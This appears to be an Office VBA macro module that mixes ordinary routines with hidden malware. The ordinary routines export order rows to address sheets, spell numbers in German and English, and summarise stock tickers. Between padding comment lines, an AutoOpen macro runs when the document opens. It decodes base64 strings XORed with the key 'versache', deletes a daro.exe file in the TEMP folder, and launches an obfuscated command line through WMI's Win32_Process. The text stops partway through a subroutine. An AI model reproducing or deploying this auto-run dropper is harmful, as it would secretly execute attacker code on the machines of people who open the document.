Attribute VB_Name = "NewMacros"
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If

Sub SmallBanana()
    Dim resFullWorkbook As String   '??????????
    Dim currentDate As Date         '????
    Dim currentMonth As String      '????
    Dim currentDay As String        '????
    Dim filePath As String          '??? excel ???????,??????
    Dim sourceFullWorkbook As String
    Dim count As Integer
    Dim j As Integer

    Dim validRow As Integer '?????
    Dim rowTitle            '???????

    Dim resWorkbook As Workbook
    Dim sourceWorkbook As Workbook

    Dim name As String
    Dim address As String
    Dim tel As String
    Dim goodsName As String
    Dim leaveWord As String
    Dim longGoodsName As String
    Dim digit As String
    Dim province As String
    Dim city As String
    Dim district As String
    Dim state As String

    currentDate = Date                '??????,?????
    currentMonth = Month(currentDate) '??????
    currentDay = Day(currentDate)     '?????

    sourceWorkbookPath = ThisWorkbook.path     '?????????,??????
    sourceFullWorkbook = ThisWorkbook.FullName '??????????,?????

    ' ??? = ????? + ? + ?
    resFullWorkbook = sourceWorkbookPath + "\?????" + currentMonth + "-" + currentDay + ".xls" '???xlsx????

    Workbooks.Add
    ActiveWorkbook.SaveAs resFullWorkbook, True
    Worksheets.Add().name = "???"

    Set resWorkbook = Application.Workbooks.Open(resFullWorkbook)       '??????
    Set sourceWorkbook = Application.Workbooks.Open(sourceFullWorkbook) '????

    '?????
    rowTitle = Array("?????", "??/??", "?", "?", "?", "??", "????", "??")
    For count = 1 To 8
    resWorkbook.Sheets("???").Cells(1, count).Value = rowTitle(count - 1)
    resWorkbook.Sheets("???").Cells(1, count).Font.Bold = True
    resWorkbook.Sheets("???").Cells(1, count).Borders.LineStyle = xlContinuous
    Next

    j = 2
    validRow = sourceWorkbook.Sheets(1).Cells(65536, 1).End(xlUp).Row '????A??????

    For i = 2 To validRow '????????????????
        name = sourceWorkbook.Sheets(1).Range("U" & i)          '?????????
        address = sourceWorkbook.Sheets(1).Range("Z" & i)       '??????????
        tel = sourceWorkbook.Sheets(1).Range("V" & i)           '???????
        goodsName = sourceWorkbook.Sheets(1).Range("H" & i)     '??????
        leaveWord = sourceWorkbook.Sheets(1).Range("T" & i)     '????
        longGoodsName = sourceWorkbook.Sheets(1).Range("E" & i)
        digit = sourceWorkbook.Sheets(1).Range("O" & i)         '??????
        province = sourceWorkbook.Sheets(1).Range("W" & i)      '???????
        city = sourceWorkbook.Sheets(1).Range("X" & i)          '???????
        district = sourceWorkbook.Sheets(1).Range("Y" & i)      '???????
        state = sourceWorkbook.Sheets(1).Range("C" & i)

        If (state = "???" And InStr(longGoodsName, "?????")) Then
            resWorkbook.Sheets("???").Range("A" & j) = name
            resWorkbook.Sheets("???").Range("B" & j) = tel

            '???,??????????
            If (InStr(province, "?")) Then
            province = Mid(province, 1, Len(province) - 1)
            End If

            resWorkbook.Sheets("???").Range("C" & j) = province
            resWorkbook.Sheets("???").Range("D" & j) = city
            resWorkbook.Sheets("???").Range("E" & j) = district
            resWorkbook.Sheets("???").Range("F" & j) = address
            resWorkbook.Sheets("???").Range("G" & j) = goodsName + " * " + digit
            resWorkbook.Sheets("???").Range("H" & j) = leaveWord

            j = j + 1
        End If
    Next
End Sub

Sub ToCircleCleanner()
    Worksheets.Add().name = "Circle Clean"
    Sheet1.Select
    Dim mycolumns '????????
    Dim name As String, tel As String, address As String, goodsName As String
    Dim money As String, purchaseprice As String
    Dim moneysum As Integer
    Dim digit As String
    Dim count As Integer
    Dim title
    Dim I2
    Dim state As String
    Dim leaveWord As String
    Dim province As String
    Dim city As String
    Dim k
    Dim district As String
    
    moneysum = 0
    mycolumns = [A65536].End(xlUp).Row 'A??????
    title = Array("?????", "??/??", "?", "?", "?", "??", "????", "??")
    j = 2

    For count = 1 To 8
        Sheets("Circle Clean").Cells(1, count).Value = title(count - 1)
        Sheets("Circle Clean").Cells(1, count).Font.Bold = True
        Sheets("Circle Clean").Cells(1, count).Borders.LineStyle = xlContinuous
    Next

    For i = 2 To mycolumns ' ????????????????
        name = Range("U" & i)           ' ?????????
        address = Range("Z" & i)        ' ??????????
        tel = Range("V" & i)            ' ???????
        goodsName = Range("H" & i)      ' ??????
        leaveWord = Range("T" & i)      ' ????
        longGoodsName = Range("E" & i)
        digit = Range("O" & i)          ' ??????
        province = Range("W" & i)       ' ???????
        city = Range("X" & i)           ' ???????
        district = Range("Y" & i)       ' ???????
        state = Range("C" & i)

        If (state = "???" And (InStr(longGoodsName, "Circle cleaner?????") Or InStr(longGoodsName, "?????"))) Then
            Sheets("Circle Clean").Range("A" & j) = name
            Sheets("Circle Clean").Range("A" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("B" & j) = tel
            Sheets("Circle Clean").Range("B" & j).Borders.LineStyle = xlContinuous

            If (InStr(province, "?")) Then
            province = Mid(province, 1, Len(province) - 1)
            End If

            Sheets("Circle Clean").Range("C" & j) = province
            Sheets("Circle Clean").Range("C" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("D" & j) = city
            Sheets("Circle Clean").Range("D" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("E" & j) = district
            Sheets("Circle Clean").Range("E" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("F" & j) = address
            Sheets("Circle Clean").Range("F" & j).Borders.LineStyle = xlContinuous

            If (InStr(goodsName, "??")) Then
            Sheets("Circle Clean").Range("G" & j) = "???(?)" + digit + "?"
            ElseIf (InStr(goodsName, "???")) Then
            Sheets("Circle Clean").Range("G" & j) = "???(?)" + digit + "?"
            ElseIf (InStr(goodsName, "???")) Then
            digit = digit * 3
            Sheets("Circle Clean").Range("G" & j) = "???(?)" + digit + "?"
            ElseIf (InStr(goodsName, "?????")) Then
            Sheets("Circle Clean").Range("G" & j) = goodsName + digit + "?"
            End If

            Sheets("Circle Clean").Range("G" & j).Borders.LineStyle = xlContinuous
            Sheets("Circle Clean").Range("H" & j) = leaveWord
            Sheets("Circle Clean").Range("H" & j).Borders.LineStyle = xlContinuous
            j = j + 1
        End If
    Next
End Sub

Public Function spellNumber( _
           ByVal Num As Long, _
           Optional lang As String = "de", _
           Optional de_1 As String = "eins", _
           Optional de_ss As String = "ss" _
           ) As String


    If Num = 0 Then ' {
       If lang = "de" Then
          spellNumber = "null"
       ElseIf lang = "en" Then
          spellNumber = "zero"
       Else
          spellNumber = "0"
       End If
       Exit Function
    End If ' }

    Dim numText As String
    numText = Num

   '  redim unitStr(9) as string
    Dim unitStr(5, 2) As String

    If lang = "en" Then ' {
       unitStr(2, 1) = " Thousand"
       unitStr(3, 1) = " Million"
       unitStr(4, 1) = " Billion"
       unitStr(5, 1) = " Trillion"

       unitStr(2, 2) = " Thousand"
       unitStr(3, 2) = " Million"
       unitStr(4, 2) = " Billion"
       unitStr(5, 2) = " Trillion"
    ' }
    ElseIf lang = "de" Then ' {
       unitStr(2, 1) = "tausend"
       unitStr(3, 1) = " Million"
       unitStr(4, 1) = " Milliarde"
       unitStr(5, 1) = " Billion"

       unitStr(2, 2) = "tausend"
       unitStr(3, 2) = " Millionen"
       unitStr(4, 2) = " Milliarden"
       unitStr(5, 2) = " Billionen"
    End If '

    Dim unitNo
    unitNo = 1

    Do While numText <> "" ' {

       Dim hundredsStr

       Dim de_ein As String
       de_ein = "ein"
       If unitNo >= 3 Then
          de_ein = "eine"
       End If

       hundredsStr = num_100_to_999(Right(numText, 3), lang, de_ein:=de_ein)

       Dim pl_sg As Integer
       pl_sg = 1

       If CLng(Right(numText, 3)) > 1 Then pl_sg = 2

'      if lang = "de" and unitNo >= 3 and cLng(right(numText, 3)) > 1 then


       If lang = "de" And unitNo >= 3 And spellNumber <> "" Then
          spellNumber = " " & spellNumber
       End If

'      hundredsStr = num_100_to_999( right(numText, 3), lang)

       If hundredsStr <> "" Then spellNumber = hundredsStr & unitStr(unitNo, pl_sg) & spellNumber

       If Len(numText) > 3 Then
          numText = Left(numText, Len(numText) - 3)
       Else
          numText = ""
       End If

       unitNo = unitNo + 1

    Loop ' }

    If (Num = 1 Or Right(Num, 2) = "01") And de_1 = "eins" Then ' {
        spellNumber = spellNumber & "s"
    End If ' }

End Function ' }

' { spellNumberWithCurrency
Public Function spellNumberWithCurrency( _
           ByVal Num As String, _
           Optional lang As String = "de", _
           Optional currency_ As String = "Franken", _
           Optional fraction As String = "Rappen", _
           Optional de_ss As String = "ss" _
       ) As String

   Dim currencyStr   As String
   Dim fractionalStr As String
'  dim Dollars, fractionalStr, Temp

' '  redim unitStr(9) as string
'  dim unitStr(5) as string

'  if lang = "en" then ' {
'     unitStr(2) = " Thousand"
'     unitStr(3) = " Million"
'     unitStr(4) = " Billion"
'     unitStr(5) = " Trillion"
'  ' }
'  elseif lang = "de" then ' {
'     unitStr(2) = " Tausend"
'     unitStr(3) = " Million"
'     unitStr(4) = " Milliarde"
'     unitStr(5) = " Billion"
'  end if ' }

  ' string representation of amount.

    Num = Trim(Str(Num))

  ' Position of decimal place 0 if none.

    Dim decimalPlace
    decimalPlace = InStr(Num, ".")

  ' Convert cents and set num to dollar amount.

    If decimalPlace > 0 Then ' {

       fractionalStr = num_10_to_99_to_string(Left(Mid(Num, decimalPlace + 1) & "00", 2), lang, de_ss:=de_ss)

       Num = Trim(Left(Num, decimalPlace - 1))

    End If ' }


    currencyStr = spellNumber(Num, lang)

'   dim unitNo
'   unitNo = 1
'   do while num <> "" ' {
'
'      dim hundredsStr
'      hundredsStr = num_100_to_999(Right(num, 3), lang)
'
'      if hundredsStr <> "" then currencyStr = hundredsStr & unitStr(unitNo) & currencyStr
'
'      if len(num) > 3 then
'         num = Left(num, len(num) - 3)
'      else
'         num = ""
'      end if
'
'      unitNo = unitNo + 1
'
'   loop ' }

    Select Case currencyStr ' {
       Case "": currencyStr = "No Dollars"
       Case "One": currencyStr = "One Dollar"
       Case Else: currencyStr = currencyStr & " " & currency_
    End Select ' }

    Select Case fractionalStr ' {
    Case "" ' {

       If lang = "en" Then
          fractionalStr = " and No " & fraction
       ElseIf lang = "de" Then
          fractionalStr = " und kein " & fraction
       End If
    ' }
    Case "One" ' {
       If lang = "en" Then
          fractionalStr = " and One Cent"
       ElseIf lang = "de" Then
          fractionalStr = " und ein " & fraction
       End If
    ' }
    Case Else ' {

       If lang = "en" Then
          fractionalStr = " and " & fractionalStr & " " & fraction
       ElseIf lang = "de" Then
          fractionalStr = " und " & fractionalStr & " " & fraction
       End If
    ' }
    End Select ' }

    spellNumberWithCurrency = currencyStr & fractionalStr

End Function ' }

Public Sub test_SpellNumber() ' {

    Call checkSpelledNumber(1, "de", "eins")
    Call checkSpelledNumber(2, "de", "zwei")
    Call checkSpelledNumber(10, "de", "zehn")
    Call checkSpelledNumber(11, "de", "elf")
    Call checkSpelledNumber(12, "de", "zwolf")
    Call checkSpelledNumber(13, "de", "dreizehn")
    Call checkSpelledNumber(20, "de", "zwanzig")
    Call checkSpelledNumber(22, "de", "zweiundzwanzig")
    Call checkSpelledNumber(30, "de", "dreissig")
    Call checkSpelledNumber(35, "de", "funfunddreissig")
    Call checkSpelledNumber(100, "de", "einhundert")                                                                                                     ' Oder hundert
    Call checkSpelledNumber(101, "de", "einhunderteins")                                                                                                 ' Oder hunderteins
    Call checkSpelledNumber(150, "de", "einhundertfunfzig")                                                                                              ' Oder hundertfunfzig
    Call checkSpelledNumber(180, "de", "einhundertachtzig")                                                                                              ' Oder hundertachtzig
    Call checkSpelledNumber(186, "de", "einhundertsechsundachtzig")
    Call checkSpelledNumber(999, "de", "neunhundertneunundneunzig")
    Call checkSpelledNumber(1000, "de", "eintausend")                                                                                                    ' Oder tausend
    Call checkSpelledNumber(1001, "de", "eintausendeins")                                                                                                ' Oder tausend
    Call checkSpelledNumber(100001, "de", "einhunderttausendeins")                                                                                       ' Oder hunderttaussendeins, einhunderttausendundeins, hunderttausendundeins
    Call checkSpelledNumber(1000000, "de", "eine Million")
    Call checkSpelledNumber(1500000, "de", "eine Million funfhunderttausend")
    Call checkSpelledNumber(4950300, "de", "vier Millionen neunhundertfunfzigtausenddreihundert")
    Call checkSpelledNumber(1234678901, "de", "eine Milliarde zweihundertvierunddreissig Millionen sechshundertachtundsiebzigtausendneunhunderteins")
    Call checkSpelledNumber(1000000000000#, "de", "eine Billion")
    Call checkSpelledNumber(2000000000000#, "de", "zwei Billionen")

 '
 '  TODO: Include me again:
 '
 '  call checkSpelledNumberWithCurrency("1", "de", "Franken", "Rappen", "Ein Franken und kein Rappen")
 '  call checkSpelledNumberWithCurrency("1", "en", "Dollar" , "Cent"  , "One Dollar and No Cent")

    Debug.Print "test finished."
End Sub ' }

Private Sub checkSpelledNumberWithCurrency(number As String, lang As String, currency_ As String, fraction As String, expected As String) ' {

   Dim gotten As String
   gotten = spellNumberWithCurrency(number, lang, currency_, fraction)

   If gotten <> expected Then ' {
      Debug.Print (number & ", " & lang & ", " & currency_ & ", " & fraction & ": " & gotten & " != " & expected)
   End If ' }

End Sub ' }

Private Sub checkSpelledNumber(Num As Long, lang As String, expected As String) ' {

   Dim gotten As String
   gotten = spellNumber(Num, lang)

   If gotten <> expected Then ' {
      Debug.Print (Num & ", " & lang & ": " & gotten & " != " & expected)
   End If ' }

End Sub ' }

Function num_100_to_999(ByVal MyNumber As String, lang As String, Optional de_ein As String = "ein", Optional de_ss As String = "ss") As String ' {
  '
  ' Spell a number between 100 and 999
  '

'   dim Result as string

    If Val(MyNumber) = 0 Then Exit Function

    MyNumber = Right("000" & MyNumber, 3)

    ' Convert the hundreds place.

    If Mid(MyNumber, 1, 1) <> "0" Then

       If lang = "en" Then
          num_100_to_999 = num_1_to_9_to_string(Mid(MyNumber, 1, 1), lang) & " Hundred "
       ElseIf lang = "de" Then
          num_100_to_999 = num_1_to_9_to_string(Mid(MyNumber, 1, 1), lang) & "hundert"
       End If

    End If

    ' Convert the tens and ones place.

    If Mid(MyNumber, 2, 1) <> "0" Then

       num_100_to_999 = num_100_to_999 & num_10_to_99_to_string(Mid(MyNumber, 2), lang, de_ss:=de_ss)

    Else

       num_100_to_999 = num_100_to_999 & num_1_to_9_to_string(Mid(MyNumber, 3), lang, de_ein:=de_ein)

    End If

'   num_100_to_999 = Result

End Function ' }

Private Function num_10_to_99_to_string(TensText As String, lang As String, Optional de_ss As String = "ss") As String ' {

  '
  ' Spell a number between 10 and 99
  '

'   dim Result as string

    num_10_to_99_to_string = "" ' Null out the temporary function value.

    If Val(Left(TensText, 1)) = 1 Then ' { if value between 10-19...

       If lang = "en" Then  ' {

          Select Case Val(TensText) ' {

              Case 10: num_10_to_99_to_string = "Ten"
              Case 11: num_10_to_99_to_string = "Eleven"
              Case 12: num_10_to_99_to_string = "Twelve"
              Case 13: num_10_to_99_to_string = "Thirteen"
              Case 14: num_10_to_99_to_string = "Fourteen"
              Case 15: num_10_to_99_to_string = "Fifteen"
              Case 16: num_10_to_99_to_string = "Sixteen"
              Case 17: num_10_to_99_to_string = "Seventeen"
              Case 18: num_10_to_99_to_string = "Eighteen"
              Case 19: num_10_to_99_to_string = "Nineteen"
              Case Else

          End Select ' }
       ' }
       ElseIf lang = "de" Then ' {

          Select Case Val(TensText) ' {

            Case 10: num_10_to_99_to_string = "zehn"
            Case 11: num_10_to_99_to_string = "elf"
            Case 12: num_10_to_99_to_string = "zwolf"
            Case 13: num_10_to_99_to_string = "dreizehn"
            Case 14: num_10_to_99_to_string = "vierzehn"
            Case 15: num_10_to_99_to_string = "funfzehn"
            Case 16: num_10_to_99_to_string = "sechszehn"
            Case 17: num_10_to_99_to_string = "siebzehn"
            Case 18: num_10_to_99_to_string = "achtzehn"
            Case 19: num_10_to_99_to_string = "neunzehn"
            Case Else

        End Select ' }

       End If ' }
    ' }
    Else ' { if value between 20-99...

       If lang = "en" Then ' {

          Select Case Val(Left(TensText, 1)) ' {
             Case 2: num_10_to_99_to_string = "Twenty"
             Case 3: num_10_to_99_to_string = "Thirty"
             Case 4: num_10_to_99_to_string = "Forty"
             Case 5: num_10_to_99_to_string = "Fifty"
             Case 6: num_10_to_99_to_string = "Sixty"
             Case 7: num_10_to_99_to_string = "Seventy"
             Case 8: num_10_to_99_to_string = "Eighty"
             Case 9: num_10_to_99_to_string = "Ninety"
             Case Else
          End Select ' }

       ' }
       ElseIf lang = "de" Then ' {
          Select Case Val(Left(TensText, 1)) ' {
            Case 2: num_10_to_99_to_string = "zwanzig"
            Case 3: num_10_to_99_to_string = "drei" & de_ss & "ig"
            Case 4: num_10_to_99_to_string = "vierzig"
            Case 5: num_10_to_99_to_string = "funfzig"
            Case 6: num_10_to_99_to_string = "sechzig"
            Case 7: num_10_to_99_to_string = "siebzig"
            Case 8: num_10_to_99_to_string = "achtzig"
            Case 9: num_10_to_99_to_string = "neunzig"
            Case Else
          End Select ' }
       End If ' }

       If lang = "en" Then ' {
          num_10_to_99_to_string = num_10_to_99_to_string & num_1_to_9_to_string(Right(TensText, 1), lang)  ' Retrieve ones place.
       Else
          If Right(TensText, 1) >= "2" And Right(TensText, 1) <= "9" Then
             num_10_to_99_to_string = num_1_to_9_to_string(Right(TensText, 1), lang) & "und" & num_10_to_99_to_string
          End If
       End If ' }

    End If ' }

    num_10_to_99_to_string = num_10_to_99_to_string

End Function ' }

  Private Function num_1_to_9_to_string(digit As String, lang As String, Optional de_ein As String = "ein") As String ' {

   If lang = "en" Then ' {

        Select Case Val(digit) ' {
           Case 1: num_1_to_9_to_string = "One"
           Case 2: num_1_to_9_to_string = "Two"
           Case 3: num_1_to_9_to_string = "Three"
           Case 4: num_1_to_9_to_string = "Four"
           Case 5: num_1_to_9_to_string = "Five"
           Case 6: num_1_to_9_to_string = "Six"
           Case 7: num_1_to_9_to_string = "Seven"
           Case 8: num_1_to_9_to_string = "Eight"
           Case 9: num_1_to_9_to_string = "Nine"
           Case Else: num_1_to_9_to_string = ""
        End Select ' }

   ' }
   ElseIf lang = "de" Then ' {

        Select Case Val(digit) ' {
           Case 1: num_1_to_9_to_string = de_ein
'                if de_eins then
'                  num_1_to_9_to_string = "eins"
'                else
'                  num_1_to_9_to_string = "ein"
'               end if
           Case 2: num_1_to_9_to_string = "zwei"
           Case 3: num_1_to_9_to_string = "drei"
           Case 4: num_1_to_9_to_string = "vier"
           Case 5: num_1_to_9_to_string = "funf"
           Case 6: num_1_to_9_to_string = "sechs"
           Case 7: num_1_to_9_to_string = "sieben"
           Case 8: num_1_to_9_to_string = "acht"
           Case 9: num_1_to_9_to_string = "neun"
           Case Else: num_1_to_9_to_string = ""
        End Select ' }

   End If ' }

End Function ' }


Sub browseFolderPath()
    Dim fileExplorer As FileDialog
    Set fileExplorer = Application.FileDialog(msoFileDialogFolderPicker)

    'Mencegah Memilih lebih dari 1 folder
    fileExplorer.AllowMultiSelect = False

    With fileExplorer
        If .Show = -1 Then 'Pilih Folder
            AbsLokasi = .SelectedItems.Item(1)
            path = AbsLokasi & "\"
        Else
            MsgBox "Pilih Folder dibatalkan"
            AbsLokasi = "" 'Ketika dibatalkan/cancel
        End If
    End With
End Sub

Sub Stocks()
For Each ws In Worksheets
    Dim last_row As Long
    Dim Total_Volume, new_row As Long
    last_row = ws.Cells(Rows.count, 1).End(xlUp).Row
    ws.Range("I1").Value = "Ticker"
    ws.Range("J1").Value = "Yearly Change"
    ws.Range("K1").Value = "Percent Change"
    ws.Range("L1").Value = "Total Stock Volume"
    Total_Volume = 0
    new_row = 2
    
'Part1: Ticker Symbol
    For i = 2 To last_row
        If ws.Cells(i + 1, 1) <> ws.Cells(i, 1) Then
        Stock_Name = ws.Cells(i, 1).Value
        ws.Range("I" & new_row).Value = Stock_Name
        new_row = new_row + 1
        End If
    Next i
    
'Part2: Yearly Price Change
    new_row = 2
    first_day = 2
    For i = 2 To last_row
        If ws.Cells(i + 1, 1) <> ws.Cells(i, 1) Then
        last_day = i
        first_day_open_price = ws.Range("C" & first_day)
        last_day_close_price = ws.Range("F" & last_day)
        yearly_change = last_day_close_price - first_day_open_price
        ws.Range("J" & new_row).Value = yearly_change
        first_day = i + 1
        
'Part3: Percent Change
            If first_day_open_price = 0 And last_day_close_price = 0 Then
            percent_change = 0
            ElseIf first_day_open_price = 0 And last_day_close_price <> 0 Then
            percent_change = 1
            Else
            percent_change = yearly_change / first_day_open_price
            ws.Range("K" & new_row).Value = percent_change
            ws.Range("K" & new_row).NumberFormat = "0.00%"
            End If
'conditional Formatting
            If yearly_change >= 0 Then
            ws.Range("J" & new_row).Interior.ColorIndex = 4
            Else
            ws.Range("J" & new_row).Interior.ColorIndex = 3
            End If
        new_row = new_row + 1
        End If
    Next i
        
'Part4: Total Volume Calculations
    new_row = 2
    For i = 2 To last_row
        If ws.Cells(i + 1, 1) <> ws.Cells(i, 1) Then
        Total_Volume = Total_Volume + ws.Range("G" & i).Value
        ws.Range("L" & new_row).Value = Total_Volume
        Total_Volume = 0
        new_row = new_row + 1
        Else
        Total_Volume = Total_Volume + ws.Range("G" & i).Value
        End If
    Next i
    
'Part5: Greatest Value Calculations
    ws.Range("O3").Value = "Greatest % Increase"
    ws.Range("O4").Value = "Greatest % Decrease"
    ws.Range("O5").Value = "Greatest Total Volume"
    ws.Range("P1").Value = "Ticker"
    ws.Range("Q1").Value = "Value"
    Greatest_Increase = ws.Range("K2").Value
    Greatest_Decrease = ws.Range("K2").Value
    Greatest_Total_Volume = ws.Range("L2").Value
'Greatest % Increase
    For i = 2 To new_row
        If ws.Range("K" & i).Value >= Greatest_Increase Then
        Greatest_Increase = ws.Range("K" & i).Value
        ws.Range("P3").Value = ws.Range("I" & i)
        ws.Range("Q3").Value = Greatest_Increase
        ws.Range("Q3").NumberFormat = "0.00%"
        End If
'Greatest % Decrease
        If ws.Range("K" & i).Value <= Greatest_Decrease Then
        Greatest_Decrease = ws.Range("K" & i).Value
        ws.Range("P4").Value = ws.Range("I" & i)
        ws.Range("Q4").Value = Greatest_Decrease
        ws.Range("Q4").NumberFormat = "0.00%"
        End If
'Greatest Total Volume
        If ws.Range("L" & i).Value >= Greatest_Total_Volume Then
        Greatest_Total_Volume = ws.Range("L" & i).Value
        ws.Range("P5").Value = ws.Range("I" & i)
        ws.Range("Q5").Value = Greatest_Total_Volume
        End If
    Next i
    ws.Columns("I:Q").EntireColumn.AutoFit
Next ws
End Sub


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Public Function ToBase64(sValue As String, Optional ByVal MultiLine As Boolean) As String
    Dim baValue()       As Byte
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        ReDim baValue(0 To 4 * Len(sValue))
        lSize = WideCharToMultiByte(CP_UTF8, 0, StrPtr(sValue), Len(sValue), baValue(0), UBound(baValue) + 1, 0, 0)
        If lSize > 0 Then
            ReDim Preserve baValue(0 To lSize - 1)
            .NodeTypedValue = baValue
        End If
        ToBase64 = .Text
        If Not MultiLine Then
            ToBase64 = Replace(Replace(ToBase64, vbCrLf, vbNullString), vbLf, vbNullString)
        End If
    End With
End Function



Public Function Groa(sBase64 As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim lSize           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin.base64"
        .Text = sBase64
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        lSize = MultiByteToWideChar(CP_UTF8, 0, baValue(0), UBound(baValue) + 1, StrPtr(sValue), Len(sValue))
        Groa = Left$(sValue, lSize)
    End With
End Function

Private Function yetras(Text As String, key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  Dim TextUB As Long
  Dim KeyUB As Long
  Dim TextPos As Long
  Dim KeyPos As Long
  
  bText = StrConv(Text, vbFromUnicode)
  bKey = StrConv(key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(KeyPos)
    If KeyPos < KeyUB Then
      KeyPos = KeyPos + 1
    Else
      KeyPos = 0
    End If
  Next TextPos
  yetras = StrConv(bText, vbUnicode)
End Function

Sub AutoOpen()
    Dim Olas As String
    Olas = Environ("TEMP") & "\daro.exe"
    If trega(Olas) Then
           Kill (Olas)
    End If
    
    Const impersonation = 3
    Set Locator = CreateObject("WbemScripting.SWbemLocator")
    Set Service = Locator.ConnectServer()
    Service.Security_.ImpersonationLevel = impersonation
    Set Process = Service.Get("Win32_Process")
    Set Dear_myBera = Service.Get(yetras(Groa("IQwcQFM8OAwYAiEHABcdFlgkFhcTBhsWS0IXHgMCGgQVABYcTw4BBgQKARwHF0YGGQhVXzMGGwoaExcyBQcaAAUWPBIMBhtYIhcHFg=="), "versache"))
    With Dear_myBera
        If .StatusCode = 0 Then
            End
        ElseIf .StatusCode > 0 Then
            End
        End If
    End With
    On Error Resume Next
    Error = Process.Create(yetras(Groa("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECAFtMRxcXElwUCBcAEBQQARYTAAcLAgAcB08ABwhZBx0ECgYaSBQQHhQEEUczBBAcBwQQRwgXFgYWE0wFBAUOARoMTQ0dE0VfNwQQHAwYBAYaDg1IOVRBFx0XWTwgOzUuFwARB0sTHRcvQ1hINgIEAAdMMxoKFQABAEFOLgwaACISFQtIOVRBFx0XWTwgOzUuFwARB0sTHRcvQ1hILBgTHRgETj8AFDcXAhQGGxFWSCchKEMAEQIVAUlOTAQAGAoEHFJVXQxBVFwbAAdGFgNK"), "versache"), Null, Null, intProcessID)

End Sub

Public Function trega(file_path As String) As Boolean
    

    trega = Dir(file_path) <> ""
    Exit Function

DirErr:
      If Err.number = 68 Then
        trega = False
    Else
        MsgBox Err.Description & " (" & Err.number & ")", , "Run-time Error"
        Stop
    End If
End Function

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Sub ToSmallBanana()
    Worksheets.Add().name = "???"
    Sheet1.Select
    Dim mycolumns '????????

    Dim x As String, name As String, tel As String, address As String, goodsName As String
    Dim goodsid As String
    Dim money As String, purchaseprice As String
    Dim moneysum As Integer
    Dim digit As String
    Dim count As Integer
    Dim title
    Dim I2
    Dim state As String
    Dim leaveWord As String
    Dim province As String
    Dim city As String
    Dim k
    Dim district As String


    mycolumns = [A65536].End(xlUp).Row 'A??????
    title = Array("?????", "??/??", "?", "?", "?", "??", "????", "??")

    j = 2

    For count = 1 To 8
    Sheets("???").Cells(1, count).Value = title(count - 1)
    Sheets("???").Cells(1, count).Font.Bold = True
    Sheets("???").Cells(1, count).Borders.LineStyle = xlContinuous
    Next

    moneysum = 0

    For i = 2 To mycolumns          '????????????????
        name = Range("U" & i)           '?????????
        address = Range("Z" & i)        '??????????
        tel = Range("V" & i)            '???????
        goodsName = Range("H" & i)      '??????
        leaveWord = Range("T" & i)      '????
        longGoodsName = Range("E" & i)
        digit = Range("O" & i)          '??????
        province = Range("W" & i)       '???????
        city = Range("X" & i)           '???????
        district = Range("Y" & i)       '???????
        state = Range("C" & i)

        If (state = "???" And InStr(longGoodsName, "?????")) Then
            If (InStr(province, "?")) Then
            province = Mid(province, 1, Len(province) - 1)
            End If

            Sheets("???").Range("C" & j) = province
            Sheets("???").Range("A" & j) = name
            Sheets("???").Range("B" & j) = tel
            Sheets("???").Range("D" & j) = city
            Sheets("???").Range("E" & j) = district
            Sheets("???").Range("F" & j) = address
            Sheets("???").Range("G" & j) = goodsName + " * " + digit
            Sheets("???").Range("H" & j) = leaveWord
